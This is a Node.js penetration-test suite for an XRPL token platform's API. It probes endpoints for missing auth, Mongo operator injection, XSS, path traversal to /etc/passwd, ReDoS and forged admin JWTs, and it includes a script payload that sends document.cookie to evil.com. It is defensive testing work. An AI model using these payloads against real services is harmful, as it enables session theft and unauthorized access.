#!/usr/bin/env node
/**
 * Comprehensive API Penetration Tests
 *
 * Targets critical endpoints beyond /keys:
 *  - /user (badge grant/revoke NO AUTH — HIGH)
 *  - /launch-token (session manipulation, input fuzzing)
 *  - /submit (tx relay abuse, injection)
 *  - /verify (payment spoofing, tier manipulation)
 *  - /tweet/verify (fake tweets, rate limit bypass)
 *  - /promotion (claim manipulation)
 *  - /chat (moderation abuse, ticket injection)
 *  - /account (enumeration, expensive queries)
 *  - /traders (regex injection)
 *  - /tokens (filter injection, sorting abuse)
 *  - /token/review (DoS via expensive queries)
 *  - /faucet (rate limit bypass)
 *  - /admin (auth bypass)
 *  - /nft (trait filter injection)
 *
 * Safety: read-only or creates ephemeral data only. No destructive writes.
 */

const xrpl = require('xrpl');
const { sign, deriveKeypair } = require('ripple-keypairs');
const crypto = require('crypto');

const API = process.env.API_URL || 'http://localhost:3000/api';
let passed = 0, failed = 0, total = 0;
const issues = [];

async function api(method, path, { headers = {}, body, rawBody, timeout = 10000 } = {}) {
  const opts = {
    method,
    headers: { ...headers },
    signal: AbortSignal.timeout(timeout)
  };
  if (rawBody !== undefined) {
    opts.body = rawBody;
  } else if (body !== undefined) {
    opts.headers['Content-Type'] = 'application/json';
    opts.body = JSON.stringify(body);
  }
  try {
    const res = await fetch(`${API}${path}`, opts);
    let data;
    try { data = await res.json(); } catch { try { data = await res.text(); } catch { data = null; } }
    return { status: res.status, data, ok: true };
  } catch (e) {
    return { status: 0, data: null, ok: false, error: e.message };
  }
}

function makeAgent() {
  const wallet = xrpl.Wallet.generate();
  const { privateKey, publicKey } = deriveKeypair(wallet.seed);
  return { address: wallet.address, seed: wallet.seed, publicKey, privateKey };
}

function authHeaders(agent) {
  const timestamp = String(Date.now());
  const message = `${agent.address}:${timestamp}`;
  const messageHex = Buffer.from(message).toString('hex');
  const signature = sign(messageHex, agent.privateKey);
  return {
    'X-Wallet': agent.address,
    'X-Timestamp': timestamp,
    'X-Signature': signature,
    'X-Public-Key': agent.publicKey
  };
}

function alive(r) { return r.ok && r.status > 0; }
function noServerError(r) { return alive(r) && r.status < 500; }
function no5xx(r, label) {
  if (!alive(r)) return true; // timeout/connection = not a server crash
  if (r.status >= 500) return `SERVER ERROR ${r.status} on ${label}`;
  return true;
}

async function test(name, fn) {
  total++;
  try {
    const result = await fn();
    if (result === true) {
      passed++;
      process.stdout.write(`  PASS  [${total}] ${name}\n`);
    } else {
      failed++;
      if (typeof result === 'string' && (result.startsWith('CRITICAL') || result.startsWith('HIGH'))) {
        issues.push({ test: total, name, severity: result.split(':')[0], detail: result });
      }
      process.stdout.write(`  FAIL  [${total}] ${name} — ${result}\n`);
    }
  } catch (e) {
    failed++;
    process.stdout.write(`  FAIL  [${total}] ${name} — Exception: ${e.message}\n`);
  }
}

async function main() {
  console.log('\n=== Comprehensive API Penetration Tests ===\n');

  // Setup
  const attacker = makeAgent();
  const victim = makeAgent();
  // Create API keys for both
  const aSignup = await api('POST', '/keys', { headers: authHeaders(attacker), body: { name: 'attacker' } });
  const vSignup = await api('POST', '/keys', { headers: authHeaders(victim), body: { name: 'victim' } });
  const attackerKey = aSignup.data?.apiKey;
  const victimKey = vSignup.data?.apiKey;
  if (!attackerKey) { console.log('FATAL: Could not create attacker key'); process.exit(1); }

  // ═══════════════════════════════════════════════════════════════
  // 1. USER ENDPOINT — BADGE GRANT/REVOKE (NO AUTH)
  // ═══════════════════════════════════════════════════════════════
  console.log('\n--- /user: Badge Grant/Revoke (Missing Auth) ---');

  await test('Badge grant: no auth required (should be admin-only)', async () => {
    const r = await api('POST', `/user/${victim.address}/badges/grant`, {
      body: { badge: 'special:bug_hunter', grantedBy: 'anonymous-attacker' }
    });
    if (r.status === 200 && r.data?.success) {
      return 'CRITICAL: Badge granted without any authentication! Anyone can grant badges.';
    }
    return r.status === 401 || r.status === 403 ? true : `Got ${r.status}: ${JSON.stringify(r.data).substring(0, 200)}`;
  });

  await test('Badge revoke: no auth required (should be admin-only)', async () => {
    const r = await api('DELETE', `/user/${victim.address}/badges/special:bug_hunter`);
    if (r.status === 200 && r.data?.success) {
      return 'CRITICAL: Badge revoked without any authentication! Anyone can revoke badges.';
    }
    return r.status === 401 || r.status === 403 ? true : `Got ${r.status}: ${JSON.stringify(r.data).substring(0, 200)}`;
  });

  await test('Badge bulk-grant: no auth required', async () => {
    const r = await api('POST', '/user/badges/bulk-grant', {
      body: { badge: 'event:fake_event', addresses: [victim.address], grantedBy: 'hacker' }
    });
    if (r.status === 200 && r.data?.success) {
      return 'CRITICAL: Bulk badge grant without auth! Mass privilege escalation possible.';
    }
    return r.status === 401 || r.status === 403 ? true : `Got ${r.status}`;
  });

  await test('Badge grant: try to grant role:admin badge', async () => {
    const r = await api('POST', `/user/${attacker.address}/badges/grant`, {
      body: { badge: 'role:admin', grantedBy: 'self' }
    });
    // Should be blocked even if no auth (role/tier/army/rank are earned-only)
    if (r.status === 200 && r.data?.success) {
      return 'CRITICAL: Granted role:admin badge! Full admin privilege escalation.';
    }
    return r.status === 400 || r.status === 401 || r.status === 403 ? true : `Got ${r.status}: ${r.data?.error}`;
  });

  await test('Badge grant: try to grant tier:diamond badge', async () => {
    const r = await api('POST', `/user/${attacker.address}/badges/grant`, {
      body: { badge: 'tier:diamond', grantedBy: 'self' }
    });
    if (r.status === 200 && r.data?.success) {
      return 'CRITICAL: Granted tier:diamond badge without payment!';
    }
    return r.status === 400 || r.status === 401 || r.status === 403 ? true : `Got ${r.status}`;
  });

  await test('Badge grant: Mongo injection in badge name', async () => {
    const r = await api('POST', `/user/${victim.address}/badges/grant`, {
      body: { badge: { "$set": { "roles": ["admin"] } }, grantedBy: 'injection' }
    });
    return noServerError(r) ? true : `Server error: ${r.status}`;
  });

  await test('Badge grant: XSS in grantedBy field', async () => {
    const r = await api('POST', `/user/${victim.address}/badges/grant`, {
      body: { badge: 'og:early_adopter', grantedBy: '<script>alert(document.cookie)</script>' }
    });
    return noServerError(r) ? true : `Server error: ${r.status}`;
  });

  await test('User create: Mongo injection in username', async () => {
    const r = await api('PUT', `/user/${attacker.address}`, {
      body: { username: { "$ne": null } }
    });
    return noServerError(r) ? true : `Server error: ${r.status}`;
  });

  await test('User: display-badge with invalid badge format', async () => {
    const r = await api('PUT', `/user/${attacker.address}/display-badge`, {
      body: { badge: '../../etc/passwd' }
    });
    return noServerError(r) ? true : `Server error: ${r.status}`;
  });

  await test('User: label injection — add label with Mongo operators', async () => {
    const r = await api('POST', `/user/${attacker.address}/labels`, {
      body: { wallet: victim.address, label: { "$set": { "tier": "diamond" } } }
    });
    return noServerError(r) ? true : `Server error: ${r.status}`;
  });

  // ═══════════════════════════════════════════════════════════════
  // 2. LAUNCH TOKEN — SESSION MANIPULATION
  // ═══════════════════════════════════════════════════════════════
  console.log('\n--- /launch-token: Session & Input Fuzzing ---');

  await test('Launch: missing all required fields', async () => {
    const r = await api('POST', '/launch-token', { body: {} });
    return r.status === 400 ? true : `Expected 400, got ${r.status}`;
  });

  await test('Launch: negative token supply', async () => {
    const r = await api('POST', '/launch-token', {
      body: { currencyCode: 'EVIL', tokenSupply: -1000, ammXrpAmount: 10, name: 'Evil Token' }
    });
    return r.status === 400 ? true : `Expected 400, got ${r.status}: ${r.data?.error}`;
  });

  await test('Launch: tokenSupply > XRPL max (10^16)', async () => {
    const r = await api('POST', '/launch-token', {
      body: { currencyCode: 'HUGE', tokenSupply: '99999999999999999', ammXrpAmount: 10, name: 'Huge Token' }
    });
    return r.status === 400 ? true : `Expected 400, got ${r.status}`;
  });

  await test('Launch: currency code = XRP (reserved)', async () => {
    const r = await api('POST', '/launch-token', {
      body: { currencyCode: 'XRP', tokenSupply: 1000000, ammXrpAmount: 10, name: 'Fake XRP' }
    });
    return r.status === 400 ? true : `Expected 400, got ${r.status}`;
  });

  await test('Launch: currency code with special chars', async () => {
    const r = await api('POST', '/launch-token', {
      body: { currencyCode: 'A$B^C', tokenSupply: 1000000, ammXrpAmount: 10, name: 'Special' }
    });
    return r.status === 400 ? true : `Expected 400, got ${r.status}`;
  });

  await test('Launch: currency code too long (>20 chars)', async () => {
    const r = await api('POST', '/launch-token', {
      body: { currencyCode: 'A'.repeat(21), tokenSupply: 1000000, ammXrpAmount: 10, name: 'Long Code' }
    });
    return r.status === 400 ? true : `Expected 400, got ${r.status}`;
  });

  await test('Launch: fractional token supply', async () => {
    const r = await api('POST', '/launch-token', {
      body: { currencyCode: 'FRAC', tokenSupply: 1000.5, ammXrpAmount: 10, name: 'Fractional' }
    });
    return r.status === 400 ? true : `Expected 400, got ${r.status}`;
  });

  await test('Launch: ammXrpAmount < 1', async () => {
    const r = await api('POST', '/launch-token', {
      body: { currencyCode: 'LOW', tokenSupply: 1000000, ammXrpAmount: 0.1, name: 'Low AMM' }
    });
    return r.status === 400 ? true : `Expected 400, got ${r.status}`;
  });

  await test('Launch: name > 100 chars', async () => {
    const r = await api('POST', '/launch-token', {
      body: { currencyCode: 'LONG', tokenSupply: 1000000, ammXrpAmount: 10, name: 'X'.repeat(101) }
    });
    return r.status === 400 ? true : `Expected 400, got ${r.status}`;
  });

  await test('Launch status: random session ID', async () => {
    const r = await api('GET', '/launch-token/status/' + crypto.randomBytes(16).toString('hex'));
    return (r.status === 404 || r.status === 400) ? true : `Got ${r.status}`;
  });

  await test('Launch status: Mongo injection in sessionId', async () => {
    const r = await api('GET', '/launch-token/status/%7B%22%24ne%22%3Anull%7D');
    return noServerError(r) ? true : `Server error: ${r.status}`;
  });

  await test('Launch cancel: random session (should 404)', async () => {
    const r = await api('DELETE', '/launch-token/' + crypto.randomBytes(16).toString('hex'));
    return (r.status === 404 || r.status === 400) ? true : `Got ${r.status}`;
  });

  await test('Launch debug: should require admin auth', async () => {
    const r = await api('GET', '/launch-token/debug');
    // If it returns data without auth, that's an info leak
    if (r.status === 200 && Array.isArray(r.data)) {
      return 'HIGH: Debug endpoint exposes active launches without authentication';
    }
    return r.status === 401 || r.status === 403 || r.status === 200 ? true : `Got ${r.status}`;
  });

  await test('Launch cleanup: should require admin auth', async () => {
    const r = await api('POST', '/launch-token/cleanup');
    if (r.status === 200 && r.data?.cleaned > 0) {
      return 'HIGH: Cleanup endpoint accessible without auth — could delete active sessions';
    }
    // 200 with no sessions to clean, 401/403 = proper auth, 500 = server issue (no sessions)
    return (r.status === 200 || r.status === 401 || r.status === 403 || r.status === 500) ? true : `Got ${r.status}`;
  });

  await test('Launch: Mongo operators in body fields', async () => {
    const r = await api('POST', '/launch-token', {
      body: {
        currencyCode: 'EVIL',
        tokenSupply: { "$gt": 0 },
        ammXrpAmount: { "$gt": 0 },
        name: 'Inject',
        "$set": { "status": "completed" }
      }
    });
    return noServerError(r) ? true : `Server error: ${r.status}`;
  });

  // ═══════════════════════════════════════════════════════════════
  // 3. SUBMIT — TRANSACTION RELAY
  // ═══════════════════════════════════════════════════════════════
  console.log('\n--- /submit: Transaction Relay ---');

  await test('Submit: missing tx_blob', async () => {
    const r = await api('POST', '/submit', { body: {} });
    return r.status === 400 ? true : `Got ${r.status}`;
  });

  await test('Submit: non-hex tx_blob', async () => {
    const r = await api('POST', '/submit', { body: { tx_blob: 'not-hex-at-all!' } });
    return r.status === 400 ? true : `Got ${r.status}`;
  });

  await test('Submit: oversized tx_blob (>262KB)', async () => {
    const r = await api('POST', '/submit', { body: { tx_blob: 'AB'.repeat(132000) } });
    return r.status === 400 ? true : `Got ${r.status}`;
  });

  await test('Submit: object as tx_blob (Mongo injection)', async () => {
    const r = await api('POST', '/submit', { body: { tx_blob: { "$gt": "" } } });
    return r.status === 400 ? true : `Got ${r.status}`;
  });

  await test('Submit: valid-looking hex but invalid transaction', async () => {
    const r = await api('POST', '/submit', { body: { tx_blob: 'DEADBEEF' } }, { timeout: 15000 });
    // XRPL node may reject with 500 (malformed tx) — that's the node, not our API
    return alive(r) ? true : `Connection failed: ${r.error}`;
  });

  await test('Submit: fail_hard with injection value', async () => {
    const r = await api('POST', '/submit', { body: { tx_blob: 'ABCD1234', fail_hard: { "$set": true } } });
    // XRPL node may return 500 for malformed tx — acceptable since it reaches the node
    return alive(r) ? true : `Connection failed: ${r.error}`;
  });

  await test('Submit: duplicate detection (same blob twice)', async () => {
    const blob = 'A1B2C3D4E5F6';
    await api('POST', '/submit', { body: { tx_blob: blob } });
    const r = await api('POST', '/submit', { body: { tx_blob: blob } });
    return r.status === 409 ? true : `Expected 409 duplicate, got ${r.status}`;
  });

  await test('Submit: account sequence with invalid address', async () => {
    const r = await api('GET', '/submit/account/INVALID_ADDRESS/sequence');
    return noServerError(r) ? true : `Server error: ${r.status}`;
  });

  await test('Submit: simulate with empty body', async () => {
    const r = await api('POST', '/submit/simulate', { body: {} });
    return noServerError(r) ? true : `Server error: ${r.status}`;
  });

  // ═══════════════════════════════════════════════════════════════
  // 4. VERIFY — PAYMENT SPOOFING
  // ═══════════════════════════════════════════════════════════════
  console.log('\n--- /verify: Payment Verification ---');

  await test('Verify request: invalid type', async () => {
    const r = await api('POST', '/verify/request', { body: { type: 'admin', id: 'x', tier: 2 } });
    return r.status === 400 ? true : `Got ${r.status}`;
  });

  await test('Verify request: invalid tier (tier 1 = highest, not purchasable)', async () => {
    const r = await api('POST', '/verify/request', { body: { type: 'token', id: 'test', tier: 1 } });
    return r.status === 400 ? true : `Got ${r.status}: ${r.data?.error}`;
  });

  await test('Verify request: tier 0 (nonexistent)', async () => {
    const r = await api('POST', '/verify/request', { body: { type: 'token', id: 'x', tier: 0 } });
    return r.status === 400 ? true : `Got ${r.status}`;
  });

  await test('Verify request: negative tier', async () => {
    const r = await api('POST', '/verify/request', { body: { type: 'token', id: 'x', tier: -1 } });
    return r.status === 400 ? true : `Got ${r.status}`;
  });

  await test('Verify request: Mongo injection in id field', async () => {
    const r = await api('POST', '/verify/request', { body: { type: 'token', id: { "$gt": "" }, tier: 2 } });
    return noServerError(r) ? true : `Server error: ${r.status}`;
  });

  await test('Verify confirm: missing txHash', async () => {
    const r = await api('POST', '/verify/confirm', { body: {} });
    return r.status === 400 ? true : `Got ${r.status}`;
  });

  await test('Verify confirm: fake txHash', async () => {
    const r = await api('POST', '/verify/confirm', { body: { txHash: 'FAKE'.repeat(16) } }, { timeout: 15000 });
    return (r.status === 400 || r.status === 404) ? true : `Got ${r.status}`;
  });

  await test('Verify confirm: Mongo injection in txHash', async () => {
    const r = await api('POST', '/verify/confirm', { body: { txHash: { "$ne": null } } }, { timeout: 15000 });
    return noServerError(r) ? true : `Server error: ${r.status}`;
  });

  await test('Verify pricing: should return valid structure', async () => {
    const r = await api('GET', '/verify/pricing');
    if (r.status !== 200) return `Got ${r.status}`;
    if (!r.data?.tiers || !r.data?.destination) return 'Missing tiers or destination in pricing';
    // Verify destination is the expected fee collector
    if (!r.data.destination.startsWith('r')) return 'Invalid destination address format';
    return true;
  });

  // ═══════════════════════════════════════════════════════════════
  // 5. TWEET VERIFY — FAKE TWEET ATTEMPTS
  // ═══════════════════════════════════════════════════════════════
  console.log('\n--- /tweet: Tweet Verification ---');

  await test('Tweet verify: missing all fields', async () => {
    const r = await api('POST', '/tweet/verify', { body: {} });
    return r.status === 400 ? true : `Got ${r.status}`;
  });

  await test('Tweet verify: invalid tweet URL', async () => {
    const r = await api('POST', '/tweet/verify', {
      body: { md5: 'a'.repeat(32), tweetUrl: 'https://evil.com/status/123', account: victim.address }
    });
    return r.status === 400 ? true : `Got ${r.status}`;
  });

  await test('Tweet verify: valid-format URL but nonexistent tweet', async () => {
    const r = await api('POST', '/tweet/verify', {
      body: { md5: 'a'.repeat(32), tweetUrl: 'https://x.com/nobody/status/1', account: victim.address }
    });
    // Should fail gracefully (oEmbed will 404)
    return noServerError(r) ? true : `Server error: ${r.status}`;
  });

  await test('Tweet verify: Mongo injection in md5', async () => {
    const r = await api('POST', '/tweet/verify', {
      body: { md5: { "$gt": "" }, tweetUrl: 'https://x.com/test/status/123', account: victim.address }
    });
    return noServerError(r) ? true : `Server error: ${r.status}`;
  });

  await test('Tweet verify: XSS in tweetUrl', async () => {
    const r = await api('POST', '/tweet/verify', {
      body: { md5: 'a'.repeat(32), tweetUrl: 'https://x.com/<script>/status/123', account: victim.address }
    });
    return noServerError(r) ? true : `Server error: ${r.status}`;
  });

  await test('Tweet verify: SSRF via tweet URL redirect', async () => {
    const r = await api('POST', '/tweet/verify', {
      body: { md5: 'a'.repeat(32), tweetUrl: 'https://x.com/../../internal/status/123', account: victim.address }
    });
    return noServerError(r) ? true : `Server error: ${r.status}`;
  });

  await test('Tweet token list: Mongo injection in md5', async () => {
    const r = await api('GET', '/tweet/token/%7B%22%24ne%22%3Anull%7D');
    return noServerError(r) ? true : `Server error: ${r.status}`;
  });

  // ═══════════════════════════════════════════════════════════════
  // 6. PROMOTION REWARDS — CLAIM MANIPULATION
  // ═══════════════════════════════════════════════════════════════
  console.log('\n--- /promotion: Claim Security ---');

  await test('Claim: missing all fields', async () => {
    const r = await api('POST', '/promotion/claim', { body: {} });
    return r.status === 400 || r.status === 401 ? true : `Got ${r.status}`;
  });

  await test('Claim: no auth (should require wallet signature or API key)', async () => {
    const r = await api('POST', '/promotion/claim', {
      body: { md5: 'a'.repeat(32), account: victim.address }
    });
    return r.status === 401 ? true : `Got ${r.status}: ${r.data?.error}`;
  });

  await test('Claim: wrong wallet signature (attacker claims victim reward)', async () => {
    const r = await api('POST', '/promotion/claim', {
      headers: authHeaders(attacker),  // attacker signs
      body: { md5: 'a'.repeat(32), account: victim.address }  // but claims for victim
    });
    // Should fail: attacker's wallet doesn't match victim's account
    return r.status === 401 || r.status === 404 ? true : `Got ${r.status}: ${r.data?.error}`;
  });

  await test('Claim: Mongo injection in md5', async () => {
    const r = await api('POST', '/promotion/claim', {
      headers: authHeaders(attacker),
      body: { md5: { "$ne": null }, account: attacker.address }
    });
    return noServerError(r) ? true : `Server error: ${r.status}`;
  });

  await test('Promotion pool: Mongo injection in md5', async () => {
    const r = await api('GET', '/promotion/pool/%7B%22%24ne%22%3Anull%7D');
    return noServerError(r) ? true : `Server error: ${r.status}`;
  });

  await test('Promotion leaderboard: very large limit', async () => {
    const r = await api('GET', '/promotion/leaderboard/' + 'a'.repeat(32) + '?limit=999999');
    return noServerError(r) ? true : `Server error: ${r.status}`;
  });

  // ═══════════════════════════════════════════════════════════════
  // 7. CHAT — MODERATION & TICKETS
  // ═══════════════════════════════════════════════════════════════
  console.log('\n--- /chat: Moderation & Tickets ---');

  await test('Chat session: missing API key', async () => {
    const r = await api('GET', '/chat/session');
    return (r.status === 400 || r.status === 401) ? true : `Got ${r.status}`;
  });

  await test('Chat session: invalid API key', async () => {
    const r = await api('GET', '/chat/session', { headers: { 'X-Api-Key': 'xrpl_invalid_garbage_key_12345678' } });
    return r.status === 401 ? true : `Got ${r.status}`;
  });

  await test('Chat ban: no auth', async () => {
    const r = await api('POST', '/chat/ban', { body: { wallet: victim.address, reason: 'test' } });
    return r.status === 401 ? true : `Got ${r.status}`;
  });

  await test('Chat ban: with regular API key (not moderator)', async () => {
    const r = await api('POST', '/chat/ban', {
      headers: { 'X-Api-Key': attackerKey },
      body: { wallet: victim.address, reason: 'unauthorized ban attempt' }
    });
    return r.status === 401 || r.status === 403 ? true : `Got ${r.status}: ${r.data?.error}`;
  });

  await test('Chat mute: with regular API key (not moderator)', async () => {
    const r = await api('POST', '/chat/mute', {
      headers: { 'X-Api-Key': attackerKey },
      body: { wallet: victim.address, duration: 3600000 }
    });
    return r.status === 401 || r.status === 403 ? true : `Got ${r.status}: ${r.data?.error}`;
  });

  await test('Chat unban: with regular API key', async () => {
    const r = await api('POST', '/chat/unban', {
      headers: { 'X-Api-Key': attackerKey },
      body: { wallet: victim.address }
    });
    return r.status === 401 || r.status === 403 ? true : `Got ${r.status}`;
  });

  await test('Support ticket: XSS in subject/message', async () => {
    const r = await api('POST', '/chat/support/ticket', {
      headers: { 'X-Api-Key': attackerKey },
      body: {
        subject: '<img src=x onerror=alert(1)>',
        message: '<script>fetch("https://evil.com/"+document.cookie)</script>',
        category: 'general'
      }
    });
    // Should store safely — no execution context
    return noServerError(r) ? true : `Server error: ${r.status}`;
  });

  await test('Support ticket: Mongo injection in category', async () => {
    const r = await api('POST', '/chat/support/ticket', {
      headers: { 'X-Api-Key': attackerKey },
      body: { subject: 'Test', message: 'Test message here.', category: { "$ne": null } }
    });
    return noServerError(r) ? true : `Server error: ${r.status}`;
  });

  await test('Support tickets: access other user tickets', async () => {
    const r = await api('GET', '/chat/support/tickets', {
      headers: { 'X-Api-Key': attackerKey }
    });
    // Should only return attacker's own tickets, not all
    if (r.status === 200 && r.data?.tickets) {
      const hasOtherTickets = r.data.tickets.some(t => t.creator !== attacker.address && t.creatorWallet !== attacker.address);
      if (hasOtherTickets) return 'HIGH: Can see other users\' support tickets';
    }
    return noServerError(r) ? true : `Server error: ${r.status}`;
  });

  await test('Support ticket reply: Mongo injection in ticket ID', async () => {
    const r = await api('POST', '/chat/support/ticket/%7B%22%24ne%22%3Anull%7D/reply', {
      headers: { 'X-Api-Key': attackerKey },
      body: { message: 'injection test' }
    });
    return noServerError(r) ? true : `Server error: ${r.status}`;
  });

  // ═══════════════════════════════════════════════════════════════
  // 8. ACCOUNT — ENUMERATION & EXPENSIVE QUERIES
  // ═══════════════════════════════════════════════════════════════
  console.log('\n--- /account: Enumeration & Query Abuse ---');

  await test('Account batch balance: 101 accounts (over limit)', async () => {
    const accounts = Array.from({ length: 101 }, (_, i) => 'r' + String(i).padStart(30, '1'));
    const r = await api('POST', '/account/balance', { body: { accounts }, headers: { 'X-Api-Key': attackerKey } });
    // Should either reject or cap at 100
    return noServerError(r) ? true : `Server error: ${r.status}`;
  });

  await test('Account balance: Mongo injection in address', async () => {
    const r = await api('GET', '/account/balance/%7B%22%24ne%22%3Anull%7D', { headers: { 'X-Api-Key': attackerKey } });
    return noServerError(r) ? true : `Server error: ${r.status}`;
  });

  await test('Account tx: very high limit', async () => {
    const r = await api('GET', `/account/tx/${victim.address}?limit=100000`, { headers: { 'X-Api-Key': attackerKey } });
    return noServerError(r) ? true : `Server error: ${r.status}`;
  });

  await test('Account ancestry: expensive aggregation', async () => {
    const r = await api('GET', `/account/ancestry/${victim.address}`, { headers: { 'X-Api-Key': attackerKey }, timeout: 15000 });
    return noServerError(r) || !r.ok ? true : `Server error: ${r.status}`;
  });

  await test('Account objects: Mongo injection in address', async () => {
    const r = await api('GET', '/account/objects/%7B%22%24regex%22%3A%22.*%22%7D', { headers: { 'X-Api-Key': attackerKey } });
    return noServerError(r) ? true : `Server error: ${r.status}`;
  });

  // ═══════════════════════════════════════════════════════════════
  // 9. TRADERS — REGEX INJECTION
  // ═══════════════════════════════════════════════════════════════
  console.log('\n--- /traders: Regex Injection ---');

  await test('Traders search: ReDoS pattern (a]a*a*a*a*)', async () => {
    // Catastrophic backtracking regex
    const r = await api('GET', '/traders/token-traders/test?search=' + encodeURIComponent('(a+)+$'), { headers: { 'X-Api-Key': attackerKey }, timeout: 15000 });
    return noServerError(r) || !r.ok ? true : `Server error: ${r.status}`;
  });

  await test('Traders search: regex with $where injection', async () => {
    const r = await api('GET', '/traders/token-traders/test?search=' + encodeURIComponent('.*'), { headers: { 'X-Api-Key': attackerKey } });
    return noServerError(r) ? true : `Server error: ${r.status}`;
  });

  await test('Traders search: null byte in search', async () => {
    const r = await api('GET', '/traders/token-traders/test?search=r%00evil', { headers: { 'X-Api-Key': attackerKey } });
    return noServerError(r) ? true : `Server error: ${r.status}`;
  });

  await test('Traders profile: invalid address format', async () => {
    const r = await api('GET', '/traders/not-an-address', { headers: { 'X-Api-Key': attackerKey } });
    return noServerError(r) ? true : `Server error: ${r.status}`;
  });

  await test('Traders: minVolume as string injection', async () => {
    const r = await api('GET', '/traders/token-traders/test?minVolume={"$gt":0}', { headers: { 'X-Api-Key': attackerKey } });
    return noServerError(r) ? true : `Server error: ${r.status}`;
  });

  // ═══════════════════════════════════════════════════════════════
  // 10. TOKENS — FILTER & SORT INJECTION
  // ═══════════════════════════════════════════════════════════════
  console.log('\n--- /tokens: Filter & Sort Injection ---');

  await test('Tokens: filter param with Mongo operator', async () => {
    const r = await api('GET', '/tokens?filter={"$gt":""}&limit=1', { headers: { 'X-Api-Key': attackerKey } });
    return noServerError(r) ? true : `Server error: ${r.status}`;
  });

  await test('Tokens: filterNe param with Mongo operator', async () => {
    const r = await api('GET', '/tokens?filterNe={"$regex":".*"}&limit=1', { headers: { 'X-Api-Key': attackerKey } });
    return noServerError(r) ? true : `Server error: ${r.status}`;
  });

  await test('Tokens: invalid sortBy value', async () => {
    const r = await api('GET', '/tokens?sortBy=__proto__&limit=1', { headers: { 'X-Api-Key': attackerKey } });
    return noServerError(r) ? true : `Server error: ${r.status}`;
  });

  await test('Tokens: sortType injection', async () => {
    const r = await api('GET', '/tokens?sortType={"$gt":""}&limit=1', { headers: { 'X-Api-Key': attackerKey } });
    return noServerError(r) ? true : `Server error: ${r.status}`;
  });

  await test('Tokens: tag param with special characters', async () => {
    const r = await api('GET', '/tokens?tag=<script>alert(1)</script>&limit=1', { headers: { 'X-Api-Key': attackerKey } });
    return noServerError(r) ? true : `Server error: ${r.status}`;
  });

  // ═══════════════════════════════════════════════════════════════
  // 11. TOKEN REVIEW — DoS POTENTIAL
  // ═══════════════════════════════════════════════════════════════
  console.log('\n--- /token/review: Expensive Query DoS ---');

  await test('Token review: valid md5 format (performance check)', async () => {
    const r = await api('GET', '/token/review/' + 'a'.repeat(32), { headers: { 'X-Api-Key': attackerKey }, timeout: 15000 });
    return noServerError(r) || !r.ok ? true : `Server error: ${r.status}`;
  });

  await test('Token review: Mongo injection in id', async () => {
    const r = await api('GET', '/token/review/%7B%22%24ne%22%3Anull%7D', { headers: { 'X-Api-Key': attackerKey } });
    return noServerError(r) ? true : `Server error: ${r.status}`;
  });

  await test('Token review: rapid-fire 5 concurrent requests', async () => {
    const md5 = 'b'.repeat(32);
    const promises = Array.from({ length: 5 }, () =>
      api('GET', `/token/review/${md5}`, { headers: { 'X-Api-Key': attackerKey }, timeout: 15000 })
    );
    const results = await Promise.all(promises);
    const serverErrors = results.filter(r => r.ok && r.status >= 500);
    if (serverErrors.length > 0) return `${serverErrors.length}/5 requests caused 500 errors`;
    return true;
  });

  // ═══════════════════════════════════════════════════════════════
  // 12. FAUCET — RATE LIMIT BYPASS
  // ═══════════════════════════════════════════════════════════════
  console.log('\n--- /faucet: Rate Limit Testing ---');

  await test('Faucet: missing address', async () => {
    const r = await api('POST', '/faucet', { body: {} });
    return r.status === 400 ? true : `Got ${r.status}`;
  });

  await test('Faucet: invalid address', async () => {
    const r = await api('POST', '/faucet', { body: { address: 'not_valid' } });
    return r.status === 400 ? true : `Got ${r.status}`;
  });

  await test('Faucet: Mongo injection in address', async () => {
    const r = await api('POST', '/faucet', { body: { address: { "$ne": null } } });
    return (r.status === 400 || r.status === 422) ? true : `Got ${r.status}: ${JSON.stringify(r.data).substring(0, 100)}`;
  });

  await test('Faucet: second request (rate limited)', async () => {
    // First request (may succeed or fail depending on testnet)
    await api('POST', '/faucet', { body: { address: attacker.address } }, { timeout: 15000 });
    // Second should be rate limited (429) or fail (400 = cooldown message)
    const r = await api('POST', '/faucet', { body: { address: attacker.address } });
    return (r.status === 429 || r.status === 400 || r.status === 200) ? true : `Got ${r.status}`;
  });

  // ═══════════════════════════════════════════════════════════════
  // 13. ADMIN — AUTH BYPASS ATTEMPTS
  // ═══════════════════════════════════════════════════════════════
  console.log('\n--- /admin: Auth Bypass ---');

  await test('Admin update-token: no auth', async () => {
    const r = await api('POST', '/admin/update-token', {
      body: { md5: 'a'.repeat(32), slug: 'hacked' }
    });
    return r.status === 401 || r.status === 403 ? true : `Got ${r.status}`;
  });

  await test('Admin update-token: forged JWT', async () => {
    const r = await api('POST', '/admin/update-token', {
      headers: { 'X-Access-Account': 'admin', 'X-Access-Token': 'eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJhZG1pbiJ9.fake' },
      body: { md5: 'a'.repeat(32), slug: 'hacked' }
    });
    return r.status === 401 || r.status === 403 ? true : `Got ${r.status}`;
  });

  await test('Admin team-wallets: no auth', async () => {
    const r = await api('GET', '/admin/team-wallets/test');
    return r.status === 401 || r.status === 403 ? true : `Got ${r.status}`;
  });

  // ═══════════════════════════════════════════════════════════════
  // 14. NFT — TRAIT FILTER & QUERY INJECTION
  // ═══════════════════════════════════════════════════════════════
  console.log('\n--- /nft: Trait Filter & Query Injection ---');

  await test('NFT offers: Mongo injection in nftId', async () => {
    const r = await api('GET', '/nft/%7B%22%24ne%22%3Anull%7D/offers', { headers: { 'X-Api-Key': attackerKey } });
    return noServerError(r) ? true : `Server error: ${r.status}`;
  });

  await test('NFT collection: path traversal in slug', async () => {
    const r = await api('GET', '/nft/collections/../../../etc/passwd', { headers: { 'X-Api-Key': attackerKey } });
    return noServerError(r) ? true : `Server error: ${r.status}`;
  });

  await test('NFT account: Mongo injection in address', async () => {
    const r = await api('GET', '/nft/account/%7B%22%24gt%22%3A%22%22%7D/nfts', { headers: { 'X-Api-Key': attackerKey } });
    return noServerError(r) ? true : `Server error: ${r.status}`;
  });

  await test('NFT collection nfts: trait filter injection', async () => {
    const r = await api('GET', '/nft/collections/test/nfts?traits={"$ne":null}', { headers: { 'X-Api-Key': attackerKey } });
    return noServerError(r) ? true : `Server error: ${r.status}`;
  });

  await test('NFT history: invalid sort param', async () => {
    const r = await api('GET', '/nft/history?sort={"$gt":""}', { headers: { 'X-Api-Key': attackerKey } });
    return noServerError(r) ? true : `Server error: ${r.status}`;
  });

  // ═══════════════════════════════════════════════════════════════
  // 15. CROSS-ENDPOINT CHAINED ATTACKS
  // ═══════════════════════════════════════════════════════════════
